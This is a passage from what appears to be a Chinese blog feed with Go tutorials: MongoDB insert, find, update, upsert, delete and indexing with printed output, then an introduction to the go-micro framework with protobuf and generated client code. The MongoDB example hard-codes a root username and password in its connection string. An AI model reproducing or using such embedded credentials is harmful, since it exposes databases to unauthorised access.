class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://github.com/tfogo/mongodb-go-tutorial</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;go.mongodb.org/mongo-driver/bson&quot;</span>    <span class="comment">//BOSN解析包</span></span><br><span class="line">   <span class="string">&quot;go.mongodb.org/mongo-driver/mongo&quot;</span>    <span class="comment">//MongoDB的Go驱动包</span></span><br><span class="line">   <span class="string">&quot;go.mongodb.org/mongo-driver/mongo/options&quot;</span></span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;context&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Users <span class="keyword">struct</span> &#123;</span><br><span class="line">Cguid <span class="keyword">string</span>   <span class="string">`bson:&quot;cguid&quot;`</span></span><br><span class="line">   Uid   <span class="keyword">int</span>      <span class="string">`bson:&quot;uid&quot;`</span></span><br><span class="line">   Text  <span class="keyword">string</span>   <span class="string">`bson:&quot;text&quot;`</span></span><br><span class="line">   Name  <span class="keyword">string</span>   <span class="string">`bson:&quot;name&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//var ctx context.Context</span></span><br><span class="line">   clientOptions := options.Client().ApplyURI(<span class="string">&quot;mongodb://root:mhxygameking@192.168.44.105:30002/xyq&quot;</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 建立客户端连接</span></span><br><span class="line">   client, err := mongo.Connect(context.TODO(), clientOptions)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatal(err)</span><br><span class="line">      fmt.Println(err)</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 检查连接情况</span></span><br><span class="line">   err = client.Ping(context.TODO(), <span class="literal">nil</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatal(err)</span><br><span class="line">      fmt.Println(err)</span><br><span class="line">   &#125;</span><br><span class="line">   fmt.Println(<span class="string">&quot;Connected to MongoDB!&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//指定要操作的数据集</span></span><br><span class="line">  <span class="comment">// collection := client.Database(&quot;xyq&quot;).Collection(&quot;ljs_test&quot;)</span></span><br><span class="line">   collection := client.Database(<span class="string">&quot;xyq&quot;</span>).Collection(<span class="string">&quot;pyc2021_rank&quot;</span>)</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//执行增删改查操作</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//插入一条数据</span></span><br><span class="line">   newUser := Users&#123;<span class="string">&quot;89_34122417_1642765091&quot;</span>, <span class="number">129829</span>, <span class="string">&quot;新的文本&quot;</span>, <span class="string">&quot;sorrymaker&quot;</span>&#125;</span><br><span class="line">   res, err := collection.InsertOne(context.TODO(), newUser) </span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123; </span><br><span class="line">         log.Fatal(err) </span><br><span class="line">   &#125; </span><br><span class="line">   fmt.Println(<span class="string">&quot;Inserted document: &quot;</span>, res.InsertedID) </span><br><span class="line"></span><br><span class="line">   <span class="comment">//插入多条数据</span></span><br><span class="line">   </span><br><span class="line">   newUser1 := Users&#123;<span class="string">&quot;89_21932437_1643320091&quot;</span>, <span class="number">139829</span>, <span class="string">&quot;新的文本1&quot;</span>, <span class="string">&quot;sorrymaker&quot;</span>&#125;</span><br><span class="line">   newUser2 := Users&#123;<span class="string">&quot;89_31933227_164442021&quot;</span>, <span class="number">139129</span>, <span class="string">&quot;新的文本2&quot;</span>, <span class="string">&quot;sorrymaker&quot;</span>&#125;</span><br><span class="line">   newUser3 := Users&#123;<span class="string">&quot;89_41931237_1642121091&quot;</span>, <span class="number">139429</span>, <span class="string">&quot;新的文本3&quot;</span>, <span class="string">&quot;sorrymaker&quot;</span>&#125;</span><br><span class="line">   news := []<span class="keyword">interface</span>&#123;&#125;&#123;newUser1, newUser2, newUser3&#125;</span><br><span class="line">   res1, err := collection.InsertMany(context.TODO(), news) </span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123; </span><br><span class="line">         log.Fatal(err) </span><br><span class="line">   &#125; </span><br><span class="line">   fmt.Println(<span class="string">&quot;Inserted document: &quot;</span>, res1.InsertedIDs) </span><br><span class="line"></span><br><span class="line">   <span class="comment">// 查找一个数据</span></span><br><span class="line">   <span class="keyword">var</span> user Users</span><br><span class="line">   filter := bson.D&#123;&#123;<span class="string">&quot;cguid&quot;</span>, <span class="string">&quot;89_22932237_1649720099&quot;</span>&#125;&#125;</span><br><span class="line"><span class="keyword">if</span> err = collection.FindOne(context.TODO(),filter).Decode(&amp;user); err != <span class="literal">nil</span>&#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125; </span><br><span class="line">   fmt.Printf(<span class="string">&quot;result:%+v\n&quot;</span>, user)</span><br><span class="line"></span><br><span class="line">   <span class="comment">//查找多个符合条件的数据</span></span><br><span class="line">   findOptions := options.Find()</span><br><span class="line">   findOptions.SetLimit(<span class="number">10</span>) <span class="comment">//限制返回的条目</span></span><br><span class="line">   <span class="keyword">var</span> results []*Users</span><br><span class="line">   filter = bson.D&#123;&#123;<span class="string">&quot;name&quot;</span>, <span class="string">&quot;sorrymaker&quot;</span>&#125;&#125;</span><br><span class="line">   cur, err := collection.Find(context.TODO(), filter, findOptions)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> cur.Next(context.TODO()) &#123;</span><br><span class="line">      <span class="keyword">var</span> elem Users</span><br><span class="line">      err := cur.Decode(&amp;elem)</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         fmt.Println(err)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      fmt.Printf(<span class="string">&quot;elem:%+v\n&quot;</span>, elem)</span><br><span class="line">      results = <span class="built_in">append</span>(results, &amp;elem)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> err := cur.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      fmt.Println(err)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   cur.Close(context.TODO()) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//更新数据</span></span><br><span class="line">   filter = bson.D&#123;&#123;<span class="string">&quot;name&quot;</span>, <span class="string">&quot;sorrymaker&quot;</span>&#125;&#125; </span><br><span class="line">   update := bson.D&#123;&#123;<span class="string">&quot;$set&quot;</span>, bson.D&#123;&#123;<span class="string">&quot;text&quot;</span>, <span class="string">&quot;修改成功&quot;</span>&#125;&#125;&#125;&#125; </span><br><span class="line">   updateResult, err := collection.UpdateOne(context.TODO(), filter, update) </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123; </span><br><span class="line">         log.Fatal(err) </span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Updated documents: %+v\n&quot;</span>, updateResult) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//更新多条数据</span></span><br><span class="line">   filter = bson.D&#123;&#123;<span class="string">&quot;name&quot;</span>, <span class="string">&quot;sorrymaker&quot;</span>&#125;&#125; </span><br><span class="line">   update = bson.D&#123;&#123;<span class="string">&quot;$set&quot;</span>, bson.D&#123;&#123;<span class="string">&quot;text&quot;</span>, <span class="string">&quot;udatemany修改成功&quot;</span>&#125;&#125;&#125;&#125; </span><br><span class="line">   updateResults, err := collection.UpdateMany(context.TODO(), filter, update) </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123; </span><br><span class="line">         log.Fatal(err) </span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;UpdateMany documents: %+v\n&quot;</span>, updateResults) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//更新数据，不存在就插入。upsert</span></span><br><span class="line">   filter = bson.D&#123;&#123;<span class="string">&quot;cguid&quot;</span>, <span class="string">&quot;89_22932437_1643120029&quot;</span>&#125;&#125; </span><br><span class="line">   update = bson.D&#123;&#123;<span class="string">&quot;$set&quot;</span>, bson.D&#123;&#123;<span class="string">&quot;text&quot;</span>, <span class="string">&quot;修改成功upsert&quot;</span>&#125;, &#123;<span class="string">&quot;cguid&quot;</span>, <span class="string">&quot;89_22932437_1643120029&quot;</span>&#125;, &#123;<span class="string">&quot;uid&quot;</span>,<span class="number">1982938</span>&#125;, &#123;<span class="string">&quot;name&quot;</span>, <span class="string">&quot;losjo&quot;</span>&#125;&#125;&#125;&#125; </span><br><span class="line">   updateOpts := options.Update().SetUpsert(<span class="literal">true</span>)  <span class="comment">// 设置upsert模式</span></span><br><span class="line">   updateResult, err = collection.UpdateOne(context.TODO(), bson.M&#123;&#125;, update, updateOpts)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">       log.Fatal(err)</span><br><span class="line">   &#125;</span><br><span class="line">   fmt.Printf(<span class="string">&quot;Upsert documents: %+v\n&quot;</span>, updateResult) </span><br><span class="line"></span><br><span class="line">   <span class="comment">// 删除一条数据</span></span><br><span class="line">   filter = bson.D&#123;&#123;<span class="string">&quot;cguid&quot;</span>, <span class="string">&quot;89_34922417_1641725099&quot;</span>&#125;&#125; </span><br><span class="line">   deleteResult, err := collection.DeleteOne(context.TODO(), filter)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatal(err)</span><br><span class="line">   &#125;</span><br><span class="line">   fmt.Printf(<span class="string">&quot;deleteone documents: %+v\n&quot;</span>, deleteResult) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//给字段加索引</span></span><br><span class="line">   indexModel := mongo.IndexModel&#123;</span><br><span class="line">      Keys: bson.D&#123;</span><br><span class="line">         &#123;<span class="string">&quot;name&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">   &#125;</span><br><span class="line">   _, err = collection.Indexes().CreateOne(context.TODO(), indexModel)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatal(err)</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 断开客户端连接</span></span><br><span class="line">   err = client.Disconnect(context.TODO())</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatal(err)</span><br><span class="line">   &#125;</span><br><span class="line">   fmt.Println(<span class="string">&quot;Connection to MongoDB closed.&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Connected to MongoDB!</span><br><span class="line">Inserted document:  ObjectID(&quot;60a0a872d7ed08cd629ddabd&quot;)</span><br><span class="line">Inserted document:  [ObjectID(&quot;60a0a872d7ed08cd629ddabe&quot;) ObjectID(&quot;60a0a872d7ed08cd629ddabf&quot;) ObjectID(&quot;60a0a872d7ed08cd629ddac0&quot;)]</span><br><span class="line">result:&#123;Cguid:89_22932237_1649720099 Uid:139829 Text:udatemany修改成功 Name:sorrymaker&#125;</span><br><span class="line">elem:&#123;Cguid:89_32933237_1644720299 Uid:139129 Text:udatemany修改成功 Name:sorrymaker&#125;</span><br><span class="line">elem:&#123;Cguid:89_42931237_1642721099 Uid:139429 Text:udatemany修改成功 Name:sorrymaker&#125;</span><br><span class="line">elem:&#123;Cguid:89_42931237_1642121099 Uid:139429 Text:udatemany修改成功 Name:sorrymaker&#125;</span><br><span class="line">elem:&#123;Cguid:89_42931237_1649721099 Uid:139429 Text:udatemany修改成功 Name:sorrymaker&#125;</span><br><span class="line">elem:&#123;Cguid:89_32932417_1649725099 Uid:129829 Text:udatemany修改成功 Name:sorrymaker&#125;</span><br><span class="line">elem:&#123;Cguid:89_22932237_1643720099 Uid:139829 Text:udatemany修改成功 Name:sorrymaker&#125;</span><br><span class="line">elem:&#123;Cguid:89_32932237_1649720099 Uid:129829 Text:udatemany修改成功 Name:sorrymaker&#125;</span><br><span class="line">elem:&#123;Cguid:89_32932237_1619720099 Uid:129829 Text:udatemany修改成功 Name:sorrymaker&#125;</span><br><span class="line">elem:&#123;Cguid:89_32933237_1649720299 Uid:139129 Text:udatemany修改成功 Name:sorrymaker&#125;</span><br><span class="line">elem:&#123;Cguid:89_22933237_1649720299 Uid:139129 Text:udatemany修改成功 Name:sorrymaker&#125;</span><br><span class="line">Updated documents: &amp;&#123;MatchedCount:1 ModifiedCount:1 UpsertedCount:0 UpsertedID:&lt;nil&gt;&#125;</span><br><span class="line">UpdateMany documents: &amp;&#123;MatchedCount:31 ModifiedCount:5 UpsertedCount:0 UpsertedID:&lt;nil&gt;&#125;</span><br><span class="line">Upsert documents: &amp;&#123;MatchedCount:1 ModifiedCount:1 UpsertedCount:0 UpsertedID:&lt;nil&gt;&#125;</span><br><span class="line">deleteone documents: &amp;&#123;DeletedCount:1&#125;</span><br><span class="line">Connection to MongoDB closed.</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go快速上手--微服务框架go-micro</title>
    <link href="/2021/05/12/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A1%86%E6%9E%B6go-micro/"/>
    <url>/2021/05/12/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A1%86%E6%9E%B6go-micro/</url>
    
    <content type="html"><![CDATA[<h2 id="go-micro特性"><a href="#go-micro特性" class="headerlink" title="go-micro特性"></a>go-micro特性</h2><p>Go Micro是一个流行的微服务架构，是一个插件化的基础框架，基于此可以构建微服务，Micro的设计哲学是可插拔的插件化架构。Go Micro 简单轻巧、易于上手、功能强大、扩展方便，是基于 Go 语言进行微服务架构时非常值得推荐的一个框架。</p><p>Go Micro有以下重要特性：</p><ul><li>服务发现：自动服务注册和名称解析。服务发现是微服务开发的核心。</li><li>负载均衡：基于服务发现构建的客户端负载均衡。一旦我们获得了服务的任意数量实例的地址，我们现在需要一种方法来决定要路由到哪个节点。</li><li>消息编码：基于内容类型的动态消息编码。这包括默认的protobuf和json。</li><li>请求/响应：基于RPC的请求/响应，支持双向流。</li><li>Async Messaging：PubSub是异步通信和事件驱动架构的重要设计思想。事件通知是微服务开发的核心模式。</li><li>可插拔接口：Go Micro为每个分布式系统抽象使用Go接口，因此，这些接口是可插拔的，并允许Go Micro与运行时无关，可以插入任何基础技术</li></ul><p><img src="/2021/05/12/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A1%86%E6%9E%B6go-micro/2.png" alt="image"></p><h2 id="go-micro通信流程"><a href="#go-micro通信流程" class="headerlink" title="go-micro通信流程"></a>go-micro通信流程</h2><p>通信的角色一共4个：server,client,register和broker，他们的各种的作用在于：</p><ol><li>Server监听客户端的调用，和Broker推送过来的信息进行处理。并且Server端需要向Register注册自己的存在或消亡，这样Client才能知道自己的状态；</li><li>Register服务的注册的发现，Client端从Register中得到Server的信息，然后每次调用都根据算法选择一个的Server进行通信，当然通信是要经过编码/解码，选择传输协议等一系列过程；</li><li>如果有需要通知所有的Server端可以使用Broker进行信息的推送，Broker 通过队列进行信息的接收和发布；</li></ol><p><img src="/2021/05/12/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A1%86%E6%9E%B6go-micro/3.png" alt="image"></p><p>Go Micro 框架的基础架构如上图所示，由 8 个核心接口组成，每个接口都有默认实现。Go micro 由以下接口列表组成:</p><ul><li>最顶层的 Service 接口是构建服务的主要组件，它把底层的各个包需要实现的接口，做了一次封装，包含了一系列用于初始化 Service 和 Client 的方法，使我们可以很简单的创建一个 RPC 服务；</li><li>server - 用于处理请求和通知。服务器是编写服务的构建基块，内置服务器是 RPC 系统</li><li>client - 用于高级别请求/响应和通知；</li><li>broker - 异步消息传递，其实就是一个消息队列系统；</li><li>config - 用于动态配置的。配置是一个接口, 用于从任意数量的源进行动态配置加载，其实就是一个配置进程/中心；</li><li>codec - 用于消息编码的（序列化和反序列化）。编解码器用于编码和解码消息, 然后再通过导线传输消息. 数据可能是 json, protobuf, beson, msgpack 等。</li><li>registry - 服务发现的注册表。注册表提供一种服务发现机制, 用于将名称解析为地址. 它可以由 consul, etcd zookeeper, dns, gossip 等支持. 服务应在启动时使用注册表进行注册, 并在关闭时取消注册。</li><li>selector - 用于负载平衡。选择器是一个负载平衡抽象, 它建立在注册表上。 户在发出请求时利用选择器. 客户端将使用选择器而不是注册表, 因为它提供了内置的负载平衡机制.</li><li>store - 用于数据存储。存储是一个简单的键值存储接口, 用于抽象掉轻量级数据存储，仅用于保存简单的状态信息，比如用户的验证状态。</li><li>transport - 用于同步通信。传输是服务之间同步请求/响应通信的接口. 它类似于 golang 网络包, 但提供了一个更高级别的抽象, 允许我们切换通信机制</li></ul><p><img src="/2021/05/12/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A1%86%E6%9E%B6go-micro/4.png" alt="image"> </p><p>Go Micro的接口间的关系如上图所示，每个接口都支持业界流行的开源方案，具体如下：</p><p><img src="/2021/05/12/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A1%86%E6%9E%B6go-micro/5.png" alt="image"></p><p>go-micro最重要的是service的创建，因为go-micro现在发布了v3版本，V2版本作者表示已经不再维护了，因此这里介绍V2和V3版本的go micro 如何创建一个服务，以及基本的服务管理指令。我们生产环境用的是V2版本，至于V3，看了下网上的资源以及项目中相关的特性介绍，感觉还是处于很初级的状态，如果直接用于生产环境感觉坑会不少，但是本着学习的目的还是想实践一下这个V3版本。另外，go micro的broker机制我们也给了实践例子，体验了go micro异步消息通信机制。</p><h2 id="新建服务（基于micro-v2）"><a href="#新建服务（基于micro-v2）" class="headerlink" title="新建服务（基于micro v2）"></a>新建服务（基于micro v2）</h2><p>先安装相关组件</p><ol><li>go get github.com/micro/micro/v3/cmd/protoc-gen-micro@master</li><li>go get github.com/micro/micro/v2</li></ol><p>我们先定义一个简单的protobuf协议文件greet.proto，定义的服务名称为Greet。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>; <span class="comment">// 指定proto版本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定golang包名</span></span><br><span class="line"><span class="keyword">option</span> go_package = <span class="string">&quot;pb/proto_demo&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">service</span> <span class="title">Greeter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">rpc</span> Greet(Request) <span class="keyword">returns</span> (Response) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">Request</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> name = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">Response</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> msg = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安装之后，利用protoc-gen-go和protoc-gen-micro生成协议go文件。这次一共会生成两个协议文件：greet.pb.go和greet.pb.micro.go。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc --micro_out&#x3D;. --go_out&#x3D;. .&#x2F;greet.proto</span><br></pre></td></tr></table></figure><p>着重观察下生成的micro版的go协议文件greet.pb.micro.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Code generated by protoc-gen-micro. DO NOT EDIT.</span></span><br><span class="line"><span class="comment">// source: greet.proto</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> proto_demo</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">fmt <span class="string">&quot;fmt&quot;</span></span><br><span class="line">proto <span class="string">&quot;github.com/golang/protobuf/proto&quot;</span></span><br><span class="line">math <span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">context <span class="string">&quot;context&quot;</span></span><br><span class="line">client <span class="string">&quot;github.com/micro/go-micro/v2/client&quot;</span></span><br><span class="line"> server <span class="string">&quot;github.com/micro/go-micro/v2/server&quot;</span></span><br><span class="line">api <span class="string">&quot;github.com/micro/micro/v3/service/api&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reference imports to suppress errors if they are not otherwise used.</span></span><br><span class="line"><span class="keyword">var</span> _ = proto.Marshal</span><br><span class="line"><span class="keyword">var</span> _ = fmt.Errorf</span><br><span class="line"><span class="keyword">var</span> _ = math.Inf</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is a compile-time assertion to ensure that this generated file</span></span><br><span class="line"><span class="comment">// is compatible with the proto package it is being compiled against.</span></span><br><span class="line"><span class="comment">// A compilation error at this line likely means your copy of the</span></span><br><span class="line"><span class="comment">// proto package needs to be updated.</span></span><br><span class="line"><span class="keyword">const</span> _ = proto.ProtoPackageIsVersion3 <span class="comment">// please upgrade the proto package</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Reference imports to suppress errors if they are not otherwise used.</span></span><br><span class="line"><span class="keyword">var</span> _ api.Endpoint</span><br><span class="line"><span class="keyword">var</span> _ context.Context</span><br><span class="line"><span class="keyword">var</span> _ client.Option</span><br><span class="line"><span class="keyword">var</span> _ server.Option</span><br><span class="line"></span><br><span class="line"><span class="comment">// Api Endpoints for Greeter service</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewGreeterEndpoints</span><span class="params">()</span> []*<span class="title">api</span>.<span class="title">Endpoint</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> []*api.Endpoint&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Client API for Greeter service</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> GreeterService <span class="keyword">interface</span> &#123;</span><br><span class="line">Greet(ctx context.Context, in *Request, opts ...client.CallOption) (*Response, error)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> greeterService <span class="keyword">struct</span> &#123;</span><br><span class="line">c    client.Client</span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewGreeterService</span><span class="params">(name <span class="keyword">string</span>, c client.Client)</span> <span class="title">GreeterService</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;greeterService&#123;</span><br><span class="line">c:    c,</span><br><span class="line">name: name,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 